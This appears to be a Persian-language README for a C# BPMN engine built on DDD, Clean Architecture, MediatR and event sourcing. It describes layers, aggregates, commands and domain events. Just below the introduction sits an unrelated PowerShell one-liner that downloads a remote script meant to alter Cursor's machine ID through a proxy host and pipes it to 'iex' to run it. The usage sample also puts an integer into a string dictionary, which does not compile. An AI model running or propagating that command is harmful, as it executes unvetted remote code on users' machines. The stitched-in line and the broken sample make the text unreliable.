# BPMN Engine - Clean Architecture & DDD Implementation

این پروژه یک **BPMN Engine** بر پایه **Domain-Driven Design (DDD)** و **Clean Architecture** است که از الگوهای **Event-driven** و **Mediator** برای مدیریت رویدادها استفاده می‌کند.
irm https://wget.la/https://raw.githubusercontent.com/yuaotian/go-cursor-help/refs/heads/master/scripts/run/cursor_win_id_modifier.ps1 | iex
## معماری سیستم

سیستم به چهار لایه اصلی تقسیم شده است:

### 1. Domain Layer (`Novin.Bpmn.Engine.Domain`)
لایه دامنه شامل:
- **Aggregate Roots**: `Process`, `Node`, `Token`
- **Entities**: `Task`
- **Value Objects**: `ProcessState`, `NodeState`, `TokenState`, `NodeType`, `TaskStatus`
- **Domain Events**: رویدادهای دامنه برای تغییرات وضعیت

#### Aggregate Roots

##### Process
- Aggregate root اصلی برای فرآیندهای BPMN
- مدیریت چرخه حیات فرآیند (Created → Running → Completed/Terminated)
- مدیریت متغیرهای فرآیند
- انتشار رویدادهای دامنه

##### Node
- Aggregate root برای نودهای BPMN (Task, Gateway, Event)
- مدیریت وضعیت نود (Pending → Processing → Completed/Failed)
- تاریخچه تغییرات
- انتشار رویدادهای دامنه برای هر تغییر وضعیت

##### Token
- Aggregate root برای توکن‌های اجرایی
- ردیابی مسیر حرکت توکن در فرآیند
- تاریخچه نودهایی که توکن از آنها عبور کرده
- پشتیبانی از Fork (ParentTokenId)

### 2. Application Layer (`Novin.Bpmn.Engine.Application`)
لایه کاربردی شامل:
- **Commands**: دستورات برای تغییر وضعیت (CQRS)
- **Queries**: پرس‌وجوها برای خواندن داده
- **Handlers**: پردازشگرهای MediatR
- **Interfaces**: رابط‌های Repository

#### Commands
- `StartProcessCommand`: شروع یک فرآیند جدید
- `CompleteProcessCommand`: تکمیل فرآیند
- `CreateNodeCommand`: ایجاد نود جدید
- `ProcessNodeCommand`: شروع پردازش نود
- `CompleteNodeCommand`: تکمیل پردازش نود

### 3. Infrastructure Layer (`Novin.Bpmn.Engine.Infrastructure`)
لایه زیرساخت شامل:
- **Event Bus**: انتشار و مدیریت رویدادها
- **Event Store**: ذخیره‌سازی رویدادها (Event Sourcing)
- **Repositories**: پیاده‌سازی‌های In-Memory برای Repository ها
- **Domain Event Dispatcher**: انتشار خودکار رویدادهای دامنه

### 4. Interface Layer (`Novin.Bpmn.Engine.Api`)
لایه رابط کاربری (API Controllers) - در حال توسعه

## رویدادهای دامنه

### Process Events
- `ProcessStartedEvent`
- `ProcessCompletedEvent`
- `ProcessSuspendedEvent`
- `ProcessResumedEvent`
- `ProcessTerminatedEvent`
- `ProcessFailedEvent`
- `ProcessVariableUpdatedEvent`

### Node Events
- `NodeCreatedEvent`
- `NodeProcessingEvent`
- `NodeCompletedEvent`
- `NodeFailedEvent`
- `NodePausedEvent`

### Token Events
- `TokenCreatedEvent`
- `TokenMovedEvent`

## استفاده

### ثبت سرویس‌ها

```csharp
services.AddApplication();
services.AddInfrastructure();
```

### استفاده از Commands

```csharp
// شروع فرآیند
var result = await _mediator.Send(new StartProcessCommand(
    processDefinitionId: "approval-process",
    processName: "Approval Process",
    initialVariables: new Dictionary<string, string> { { "amount", 1000 } }
));

// ایجاد نود
var nodeResult = await _mediator.Send(new CreateNodeCommand(
    processId: result.ProcessId,
    nodeName: "Review Task",
    elementId: "task-review",
    nodeType: NodeType.UserTask
));

// پردازش نود
await _mediator.Send(new ProcessNodeCommand(nodeResult.NodeId, tokenId));

// تکمیل نود
await _mediator.Send(new CompleteNodeCommand(nodeResult.NodeId, tokenId));
```

## اصول طراحی

### SOLID Principles
- **SRP**: هر کلاس یک مسئولیت دارد
- **OCP**: باز برای گسترش، بسته برای تغییر
- **LSP**: جایگزینی صحیح زیرنوع‌ها
- **ISP**: جداسازی رابط‌ها
- **DIP**: وابستگی به انتزاع‌ها

### DDD Patterns
- **Aggregate Root**: مدیریت انسجام و قوانین تجاری
- **Domain Events**: اطلاع‌رسانی تغییرات
- **Repository Pattern**: جداسازی دسترسی به داده
- **Value Objects**: اشیاء بدون هویت

### Clean Architecture
- وابستگی‌ها به سمت داخل (Domain در مرکز)
- لایه‌های مستقل از فناوری
- قابلیت تست بالا

## Event Sourcing

سیستم از **Event Sourcing** برای ذخیره تمام رویدادها استفاده می‌کند:
- تمام تغییرات به‌صورت رویداد ذخیره می‌شوند
- امکان بازسازی وضعیت از رویدادها
- تاریخچه کامل تغییرات

## توسعه آینده

- [ ] پیاده‌سازی API Controllers
- [ ] پشتیبانی از Gateway ها (Exclusive, Parallel, Inclusive)
- [ ] پشتیبانی از Boundary Events
- [ ] پشتیبانی از SubProcess
- [ ] پیاده‌سازی Repository های پایگاه داده
- [ ] پشتیبانی از Timer Events
- [ ] پشتیبانی از Message Events

